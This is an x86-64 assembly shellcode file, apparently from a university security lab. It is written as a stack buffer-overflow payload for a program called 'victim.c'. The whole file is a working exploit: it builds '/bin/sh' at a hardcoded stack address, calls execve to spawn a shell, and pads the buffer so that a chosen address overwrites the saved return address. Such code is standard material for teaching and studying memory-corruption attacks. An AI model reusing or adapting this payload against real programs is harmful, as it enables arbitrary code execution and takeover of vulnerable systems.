/* victim.c */
/* Author: Zecheng He @ Princeton University */
/Payload (write to stack) to invoke a shell in victim.c/

#include <sys/syscall.h>

.globl main
        .type   main, @function

main:

        xor     %rcx, %rcx
        xor     $0x7fff, %cx
        shl     $32, %rcx

        xor     %rax, %rax
        xor     $0xffffdf18, %eax
        xor     %rax, %rcx              /* %rcx=0x00007fffffffdf50 (ptr to str  "/bin/sh") */

        xor     %al, %al
        mov     %al, 7(%rcx)             /* Add '\0' to "/bin/sh" */
        movq    %rcx, 8(%rcx)           /* Ptr to ['/bin/sh'] */

        mov     $59, %al                 /* syscall arg 1: syscall number execve(59) */
        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
        leaq    8(%rcx), %rsi            /* syscall arg 3: argv ptr to ['/bin/sh']*/
        xor     %rdx, %rdx               /* syscall arg 4: envp (NULL) */
        syscall                          /* Call execve("/bin/sh", ["/bin/sh"], []) */

        xor     %rax, %rax
        mov     $60, %al                 /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
        syscall                          /* invoke syscall */

        .ascii  "/bin/sh"
        .ascii  "aaaaaa"
        .ascii  "bbbb"
        .ascii  "cccc"
        .ascii  "dddd"
        .ascii  "eeee"
        .ascii  "fff"
        // .ascii  "gggg"
        .quad   0x7fffffffdee0           /* buffer ptr (the first instruction of payload), will overwrite real return address */
